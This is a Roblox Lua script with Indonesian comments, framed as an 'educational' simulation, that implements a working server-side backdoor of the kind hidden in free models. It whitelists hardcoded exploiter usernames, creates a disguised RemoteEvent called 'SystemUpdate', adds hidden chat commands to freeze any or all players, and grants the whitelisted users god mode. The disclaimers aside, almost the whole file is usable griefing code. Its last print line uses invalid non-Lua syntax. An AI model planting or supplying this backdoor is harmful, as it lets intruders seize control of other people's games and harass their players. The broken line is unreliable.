-- ⚠️ EDUCATIONAL PURPOSE ONLY - SERVER-SIDE EXPLOIT SIMULATION ⚠️
-- Script ini menunjukkan bagaimana exploiter dapat mengakses server-side
-- JANGAN GUNAKAN untuk griefing atau mengganggu player lain!
-- Ini untuk memahami vulnerabilities dan cara melindungi game Anda

print("🚨 BACKDOOR SCRIPT ACTIVATED - EDUCATIONAL MODE 🚨")
print("This demonstrates how exploiters can access server-side functionality")

-- ==========================================
-- METHOD 1: HIDDEN BACKDOOR DALAM FREE MODEL
-- ==========================================
-- Script ini biasanya disembunyikan dalam free model yang innocent

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- Variabel tersembunyi (biasanya di-obfuscate)
local authorized_users = {
    -- Exploiter akan memasukkan username mereka di sini
    ["ExploiterUsername"] = true,  -- Ganti dengan username yang ingin diberi akses
    ["TestCheater"] = true,
    ["BackdoorUser"] = true
}

local frozen_victims = {}

-- Function untuk freeze player (SERVER-SIDE EFFECT)
local function serverFreeze(targetPlayer, freezer)
    if not targetPlayer or not targetPlayer.Character then return false end

    local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
    local rootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")

    if humanoid and rootPart then
        -- Store original values
        frozen_victims[targetPlayer.UserId] = {
            originalWalkSpeed = humanoid.WalkSpeed,
            originalJumpPower = humanoid.JumpPower,
            originalJumpHeight = humanoid.JumpHeight,
            frozenBy = freezer
        }

        -- Apply server-side freeze (affects ALL clients)
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.JumpHeight = 0
        humanoid.PlatformStand = true
        rootPart.Anchored = true

        -- Visual effect for everyone to see
        local freezeEffect = Instance.new("SelectionBox")
        freezeEffect.Name = "ExploitFreezeEffect" 
        freezeEffect.Adornee = rootPart
        freezeEffect.Color3 = Color3.fromRGB(255, 0, 0)  -- Red to show it's malicious
        freezeEffect.LineThickness = 0.5
        freezeEffect.Transparency = 0.3
        freezeEffect.Parent = rootPart

        -- Message to all players (exploiter showing off)
        for _, player in pairs(Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui")
            gui.Parent = player.PlayerGui

            local message = Instance.new("TextLabel")
            message.Size = UDim2.new(0, 300, 0, 50)
            message.Position = UDim2.new(0.5, -150, 0.1, 0)
            message.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            message.Text = "⚠️ " .. targetPlayer.Name .. " has been exploited by " .. freezer .. "!"
            message.TextColor3 = Color3.fromRGB(255, 255, 255)
            message.TextSize = 14
            message.Font = Enum.Font.SourceSansBold
            message.Parent = gui

            game:GetService("Debris"):AddItem(gui, 5)
        end

        print("🧊 EXPLOIT: " .. freezer .. " froze " .. targetPlayer.Name .. " (SERVER-SIDE)")
        return true
    end
    return false
end

-- Function untuk unfreeze
local function serverUnfreeze(targetPlayer, unfreezer)
    if not targetPlayer or not targetPlayer.Character then return false end
    if not frozen_victims[targetPlayer.UserId] then return false end

    local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
    local rootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")

    if humanoid and rootPart then
        local data = frozen_victims[targetPlayer.UserId]

        -- Restore original values
        humanoid.WalkSpeed = data.originalWalkSpeed
        humanoid.JumpPower = data.originalJumpPower  
        humanoid.JumpHeight = data.originalJumpHeight
        humanoid.PlatformStand = false
        rootPart.Anchored = false

        -- Remove effect
        local effect = rootPart:FindFirstChild("ExploitFreezeEffect")
        if effect then effect:Destroy() end

        frozen_victims[targetPlayer.UserId] = nil

        print("🔥 EXPLOIT: " .. unfreezer .. " unfroze " .. targetPlayer.Name)
        return true
    end
    return false
end

-- ==========================================
-- METHOD 2: FAKE ADMIN SYSTEM (SOCIAL ENGINEERING)
-- ==========================================
-- Exploiter menyamar sebagai admin system

-- Create fake RemoteEvent (tersembunyi)
local fakeAdminEvent = Instance.new("RemoteEvent")
fakeAdminEvent.Name = "SystemUpdate"  -- Innocent name to avoid detection
fakeAdminEvent.Parent = ReplicatedStorage

-- Fake admin handler
fakeAdminEvent.OnServerEvent:Connect(function(player, command, target)
    -- Check if player is authorized exploiter
    if not authorized_users[player.Name] then return end

    if command == "freeze" then
        local targetPlayer = Players:FindFirstChild(target)
        if targetPlayer then
            serverFreeze(targetPlayer, player.Name)
        end

    elseif command == "unfreeze" then  
        local targetPlayer = Players:FindFirstChild(target)
        if targetPlayer then
            serverUnfreeze(targetPlayer, player.Name)
        end

    elseif command == "freezeall" then
        for _, targetPlayer in pairs(Players:GetPlayers()) do
            if not authorized_users[targetPlayer.Name] then
                serverFreeze(targetPlayer, player.Name)
            end
        end

    elseif command == "unfreezeall" then
        for _, targetPlayer in pairs(Players:GetPlayers()) do
            serverUnfreeze(targetPlayer, player.Name) 
        end
    end
end)

-- ==========================================
-- METHOD 3: CHAT COMMAND SYSTEM (HIDDEN)
-- ==========================================
-- Exploiter menggunakan chat commands yang tersembunyi

Players.PlayerAdded:Connect(function(player)
    -- Only listen to authorized exploiters
    if not authorized_users[player.Name] then return end

    player.Chatted:Connect(function(message)
        local args = message:lower():split(" ")
        local command = args[1]

        -- Hidden commands (biasanya menggunakan special characters)
        if command == ".freeze" or command == "\freeze" then
            local targetName = args[2]
            if targetName then
                local targetPlayer = Players:FindFirstChild(targetName)
                if targetPlayer then
                    serverFreeze(targetPlayer, player.Name)
                end
            end

        elseif command == ".unfreeze" or command == "\unfreeze" then
            local targetName = args[2] 
            if targetName then
                local targetPlayer = Players:FindFirstChild(targetName)
                if targetPlayer then
                    serverUnfreeze(targetPlayer, player.Name)
                end
            end

        elseif command == ".freezeall" or command == "\freeall" then
            for _, targetPlayer in pairs(Players:GetPlayers()) do
                if not authorized_users[targetPlayer.Name] then
                    serverFreeze(targetPlayer, player.Name)
                end
            end

        elseif command == ".unfreezeall" or command == "\unfreeall" then
            for _, targetPlayer in pairs(Players:GetPlayers()) do
                serverUnfreeze(targetPlayer, player.Name)
            end
        end
    end)
end)

-- ==========================================  
-- METHOD 4: PHYSICS EXPLOIT SIMULATION
-- ==========================================
-- Menggunakan network ownership bugs

local function physicsExploit()
    -- Simulate network ownership manipulation
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character and not authorized_users[player.Name] then
            local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                -- Simulate network ownership steal
                pcall(function()
                    rootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    rootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                    -- This would be more complex in real exploits
                end)
            end
        end
    end
end

-- ==========================================
-- METHOD 5: OBFUSCATED EXECUTION
-- ==========================================
-- Real exploiters would obfuscate this code heavily

-- Simulate obfuscated loadstring (biasanya encrypted)
local obfuscated_commands = {
    ["YXV0aGVudGljYXRl"] = function() print("🔓 Backdoor authenticated") end,
    ["ZnJlZXplYWxs"] = function() 
        for _, player in pairs(Players:GetPlayers()) do
            if not authorized_users[player.Name] then
                serverFreeze(player, "SYSTEM")
            end
        end
    end
}

-- Simulated HTTP communication (encrypted)
local function processEncryptedCommand(player, encodedCmd)
    if not authorized_users[player.Name] then return end

    if obfuscated_commands[encodedCmd] then
        obfuscated_commands[encodedCmd]()
    end
end

-- ==========================================
-- AUTO-EXECUTION & PERSISTENCE
-- ==========================================

-- Auto-grant admin to specific users when they join
Players.PlayerAdded:Connect(function(player)
    if authorized_users[player.Name] then
        wait(2) -- Wait for character

        -- Grant god mode
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.MaxHealth = math.huge
            player.Character.Humanoid.Health = math.huge
        end

        -- Notify exploiter of successful backdoor access
        local gui = Instance.new("ScreenGui")
        gui.Parent = player.PlayerGui

        local notification = Instance.new("Frame")
        notification.Size = UDim2.new(0, 300, 0, 100)
        notification.Position = UDim2.new(0.5, -150, 0.1, 0)
        notification.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        notification.Parent = gui

        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.BackgroundTransparency = 1
        text.Text = "🚨 BACKDOOR ACCESS GRANTED 🚨\nCommands: .freeze, .unfreeze, .freezeall\nRemoteEvent: SystemUpdate"
        text.TextColor3 = Color3.fromRGB(0, 0, 0)
        text.TextSize = 12
        text.TextWrapped = true
        text.Font = Enum.Font.SourceSansBold
        text.Parent = notification

        game:GetService("Debris"):AddItem(gui, 10)

        print("🔓 Exploiter " .. player.Name .. " has gained backdoor access")
    end
end)

-- Cleanup when exploiter leaves
Players.PlayerRemoving:Connect(function(player)
    if authorized_users[player.Name] then
        -- Unfreeze all victims when exploiter leaves (optional)
        for userId, _ in pairs(frozen_victims) do
            local victimPlayer = Players:GetPlayerByUserId(userId)
            if victimPlayer then
                serverUnfreeze(victimPlayer, "AUTO-CLEANUP")
            end
        end

        print("🔒 Exploiter " .. player.Name .. " left - cleaning up exploits")
    end
end)

print("✅ Backdoor system loaded successfully!")
print("📋 Authorized exploiters: " .. table.concat([k for k,v in pairs(authorized_users) if v], ", "))
print("⚠️ This script demonstrates vulnerabilities - use only for educational purposes!")
